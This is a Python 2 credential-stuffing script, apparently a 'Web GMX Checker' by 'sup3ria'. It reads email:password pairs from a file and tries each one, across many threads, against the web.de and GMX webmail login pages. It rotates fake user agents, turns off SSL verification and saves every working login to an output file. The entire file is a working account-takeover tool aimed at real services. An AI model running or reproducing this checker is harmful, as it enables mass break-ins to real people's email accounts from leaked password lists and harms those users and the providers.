#!/usr/bin/python
#- * -coding: cp1252 - * -
import sys
import threading
import Queue
from timeit import default_timer as timer
import mechanize
import cookielib
import random
from fake_useragent import UserAgent #pip install fake-useragent
import ssl
import time

ssl._create_default_https_context = ssl._create_unverified_context

if sys.argv[1: ]:
    file_in = sys.argv[1]
else :
    file_in = "mail_pass.txt"

if sys.argv[2: ]:
    file_out = sys.argv[2]
else :
    file_out = "out.txt"

if sys.argv[3: ]:
    workers = int(sys.argv[3]) + 1
else :
    workers = 20

asci = '''
\    / _ |_   /~_|\/|\/  /~`|_  _  _|  _  _
 \/\/ (/_|_)  \_/|  |/\  \_,| |(/_(_|<(/_| 
  v1.0 - Using WebPanel Login - Coded by sup3ria
 '''
print asci
def login(i,j,ur):
    ua = UserAgent()
    cookiejar =cookielib.LWPCookieJar()
    br = mechanize.Browser()
    br.set_cookiejar(cookiejar)
    #br.set_debug_http(True)
    br.set_handle_robots(False)
    br.set_handle_refresh(False)
    br.addheaders = [('User-Agent', ua.random), ('Accept', '*/*')]
    url = "http://www."+ur+"/"
    br.open(url)
    br.select_form(nr = 1)
    br.form['username'] = i
    br.form['password'] = j
    br.submit()
    if len(br.geturl()) == 72:
        return True
    else:
        return False

def write(valid,file_out):
	with open(file_out, 'a') as file:
		file.write('{0}'.format(valid+'\n'))

def threader():
    while not q.empty():
        task = q.get()
        usr = task.split(':')[0].lower()
        pw = task.split(':')[1]
        ur = ''
        if 'web.de' in usr:
            ur = 'web.de'
        if 'gmx' in usr:
            ur = 'gmx.net'
        if len(ur)>3:
            l = login(usr,pw,ur)
            if l == True:
                write(task,file_out)
                print str(usr),' True'+'\n'
            else:
                print str(usr),' False'+'\n'
        q.task_done()

q = Queue.Queue() 

with open(file_in, "r") as text_file:
    for line in text_file:
        if len(line.strip()) > 1:
            q.put(line.strip())
            
for x in range(workers):
    t = threading.Thread(target = threader)
    t.daemon = True
    t.start() 
 
start = timer()
q.join()
end = timer()
print "Done."
print "Time passed: " + str(end - start)
time.sleep(60)
